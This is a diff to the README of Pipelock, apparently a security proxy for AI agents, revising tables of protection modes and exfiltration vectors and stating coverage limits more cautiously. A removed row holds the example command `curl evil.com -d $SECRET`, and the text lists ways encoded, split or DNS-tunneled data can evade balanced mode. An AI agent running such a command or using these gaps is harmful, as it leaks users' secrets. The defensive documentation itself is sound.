@@ -233,27 +233,31 @@ Pipelock runs in three modes:
 | Mode | Security | Web Browsing | Use Case |
 |------|----------|--------------|----------|
 | **strict** | Allowlist-only | None | Regulated industries, high-security |
-| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
-| **audit** | Ordinary policy warns; core floors can block | Via fetch or forward proxy, with core destination checks | Evaluate policy with core protection active |
+| **balanced** | URL DLP and entropy checks; body policy varies | Via fetch or forward proxy | Most developers (default) |
+| **audit** | Ordinary policy warns with `enforce: false`; core floors can block | Via fetch or forward proxy, with core destination checks | Evaluate policy with core protection active |
 
 For agents running uncensored or abliterated models, the [`hostile-model` preset](configs/hostile-model.yaml) layers defenses on strict mode: aggressive entropy thresholds, blanket network-tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains through dependency signals.
 
+The table describes the shipped presets for traffic Pipelock can inspect. `mode: audit` alone doesn't turn off enforcement; the `audit` preset also sets `enforce: false`.
+
 | Attack Vector | Strict | Balanced | Audit |
 |---------------|--------|----------|-------|
-| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
-| Secret in URL query params | **Prevented** | **Detected** by DLP | Logged |
-| Base64-encoded secret in URL | **Prevented** | **Detected** by entropy and decoded DLP | Logged |
-| DNS tunneling | **Prevented** | **Detected** by subdomain entropy | Logged |
-| Chunked exfiltration | **Prevented** | **Detected** by rate, budget, and fragment checks | Logged |
-| Public-key encrypted blob in URL | **Prevented** | Logged when entropy flags it | Logged |
+| Secret in request body | Blocks unlisted hosts; scans allowed hosts | Core credentials block; other matches follow body policy | Core credentials block; ordinary findings warn |
+| Secret in URL query params | Blocks unlisted hosts; scans allowed hosts | Blocks matching DLP; unrecognized data can pass | Core credentials block; other findings warn |
+| Encoded data in URL | Blocks unlisted hosts; scans allowed hosts | Decoded DLP and entropy checks; limited coverage | Core matches block; other findings warn |
+| DNS tunneling | Blocks unlisted hosts through the proxy | Limited DLP and entropy checks on hostnames | Core matches block; other findings warn |
+| Chunked exfiltration | Blocks unlisted hosts; configured limits apply | Rate limits apply; budgets and fragment checks need configuration | Ordinary findings warn |
+| Encrypted data in URL | Blocks unlisted hosts; scans allowed hosts | Entropy may block; some data passes | Ordinary findings warn |
 
-> **Honest assessment:** Strict mode blocks outbound HTTP that traverses Pipelock except allowlisted API domains, so there is no exfiltration channel through the proxy itself. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`) or the host/cluster containment topology enforced, Pipelock adds an OS or deployment boundary on top of content inspection. Direct egress still has to be blocked by that boundary for non-cooperative tools that ignore proxy settings.
+HTTPS inside CONNECT requires [TLS interception](docs/guides/tls-interception.md) for content scanning. CONNECT passthrough doesn't expose URL paths, query values or bodies. Pipelock checks hostnames in proxied requests; direct DNS needs containment. Audit safety checks can still refuse traffic. See [coverage limits](docs/bypass-resistance.md).
+
+Strict limits requests to allowlisted destinations; data can still leave through an approved service. Balanced catches matching secrets and some suspicious URLs, but formatless, encoded or split data can pass. The audit preset observes ordinary policy and retains safety blocks. With the sandbox enabled (`pipelock sandbox`) or host/cluster containment enforced, Pipelock adds an OS or deployment boundary. Direct egress still needs that boundary for tools that ignore proxy settings.
 
 ### Comparison
 
 | | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
 |---|---|---|---|---|
-| Secret exfiltration prevention | Strict blocks; balanced detects | Partial (proxy mode) | Partial (domain-level) | Yes |
+| Secret exfiltration prevention | Destination limits and content checks; coverage varies | Partial (proxy mode) | Partial (domain-level) | Yes |
 | DLP + entropy analysis | Yes | No | No | Partial |
 | Prompt injection detection | Yes | Yes | No | No |
 | MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
